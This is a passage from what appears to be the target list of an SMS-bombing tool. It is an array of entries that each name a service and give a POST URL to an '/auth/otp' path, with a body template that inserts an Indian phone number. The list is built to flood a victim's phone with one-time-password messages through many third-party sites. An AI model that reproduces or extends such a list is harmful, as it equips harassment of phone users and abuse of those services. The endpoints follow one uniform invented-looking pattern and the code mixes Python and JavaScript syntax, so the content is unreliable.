    {
        'name': 'Keynote_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.keynote.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'PowerPoint_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.powerpoint.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Google_Slides_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.slides.google.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Prezi_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.prezi.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SlideShare_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.slideshare.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HaikuDeck_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.haikudeck.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Emaze_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.emaze.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sway_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.sway.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Visme_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.visme.co/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Beautiful.ai_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.beautiful.ai/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gamma_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gamma.app/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tome_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tome.app/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pitch_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pitch.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Zight_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.zight.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Loom_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.loom.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ScreenRec_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.screenrec.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'OBS_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.obsproject.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Streamlabs_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.streamlabs.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Twitch_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.twitch.tv/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'YouTube_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://www.youtube.com/api/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Reddit_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.reddit.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TikTok_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tiktok.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Snapchat_Login_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://accounts.snapchat.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pinterest_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pinterest.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tumblr_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tumblr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Flickr_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.flickr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vimeo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vimeo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Dailymotion_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dailymotion.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SoundCloud_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.soundcloud.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Spotify_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.spotify.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Apple_Music_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.applemusic.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Amazon_Music_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.amazonmusic.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Gaana_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.gaana.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'JioSaavn_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.jiosaavn.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Wynk_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wynk.in/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hungama_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hungama.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'YouTube_Music_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.youtube.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tidal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tidal.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Deezer_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.deezer.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pandora_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pandora.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'iHeartRadio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.iheartradio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SiriusXM_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.siriusxm.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TuneIn_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tunein.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Radioplayer_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.radioplayer.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Audible_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.audible.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Storytel_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.storytel.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Kobo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.kobo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Scribd_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.scribd.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Medium_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.medium.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Substack_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.substack.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Ghost_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.ghost.org/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'WordPress_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.wordpress.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Blogger_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.blogger.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Tumblr_Login_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.tumblr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LiveJournal_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.livejournal.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Xing_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.xing.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Viadeo_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.viadeo.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'About.me_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.about.me/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AngelList_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.angellist.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'ProductHunt_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.producthunt.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'IndieHackers_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.indiehackers.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Dev.to_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.dev.to/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hashnode_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hashnode.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Devfolio_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.devfolio.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Hackathon_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hackathon.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MLH_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.mlh.io/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HackerRank_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hackerrank.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LeetCode_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.leetcode.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'CodeChef_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.codechef.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Codeforces_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.codeforces.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'AtCoder_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.atcoder.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'TopCoder_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.topcoder.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'SPOJ_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.spoj.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'HackerEarth_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.hackerearth.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Codewars_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.codewars.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Codingame_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.codingame.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Pluralsight_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.pluralsight.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Coursera_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.coursera.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'edX_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.edx.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Udacity_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.udacity.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Udemy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.udemy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Skillshare_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.skillshare.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'LinkedIn_Learning_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.linkedinlearning.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'MasterClass_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.masterclass.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Brilliant_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.brilliant.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Khan_Academy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.khanacademy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Byjus_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.byjus.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Unacademy_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.unacademy.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Vedantu_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.vedantu.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Toppr_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.toppr.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Meritnation_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.meritnation.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Aakash_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.aakash.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'FIITJEE_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.fiitjee.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Resonance_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.resonance.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Allen_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.allen.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Narayana_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.narayana.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Chaitanya_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.chaitanya.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Sri_Chaitanya_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.srichaitanya.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
    {
        'name': 'Career_Point_SMS',
        'type': 'sms',
        'country': 'in',
        'method': 'POST',
        'url': 'https://api.careerpoint.com/v1/auth/otp',
        'headers': {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'},
        'data': (phone) => `{"phone":"${phone}","countryCode":"91"}`
    },
